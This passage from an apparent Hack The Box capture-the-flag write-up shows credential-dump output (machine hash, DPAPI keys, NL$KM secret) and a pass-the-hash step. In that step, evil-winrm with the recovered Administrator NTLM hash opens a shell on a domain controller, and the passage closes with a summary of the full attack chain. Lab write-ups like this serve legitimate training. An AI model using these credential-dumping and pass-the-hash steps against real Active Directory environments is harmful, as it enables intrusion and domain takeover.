$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
dpapi_userkey:0x33aef7188b336e1e7e32e49e6a02707b99214d31
[*] NL$KM 
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] Cleaning up...
```

Success — we've recovered the NTLM hash for the **local `Administrator`** account on `DC01`: `4d470bb7497acf3f5f5c2a11872e02ac`.

> This is also where the `darkzero.ext` `krbtgt` AES key referenced earlier (Phase 9) actually comes from: an equivalent `secretsdump` run against `DC02` — using the same backup-intent technique with `celia`'s access there — pulls the full NTDS.DIT contents for the `darkzero.ext` domain, including the `krbtgt` account's keys. That's the credential material that made the cross-forest ticket-forging step possible in the first place.

## Phase 12: Full Domain Admin — Pass-the-Hash to DC01

With a valid NTLM hash for `Administrator` on `DC01`, we can authenticate without ever knowing the plaintext password, using **pass-the-hash** over WinRM:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ evil-winrm -i DC01.darkzero.htb -u Administrator -H 4d470bb7497acf3f5f5c2a11872e02ac
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                              
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                         
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

The connection succeeds, confirming the recovered hash is valid and giving us an interactive PowerShell session as `Administrator` on `DC01` — full administrative control of the domain controller.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
[REDACTED]
```

And that's the box — full compromise achieved, starting from an unauthenticated web app all the way through Node.js template-engine internals, CI/CD pipeline abuse, a broken AD OU permission, a cross-forest Kerberos trust, and a privileged-backup SMB trick. A good reminder of how many small misconfigurations, chained together, can add up to complete domain takeover.
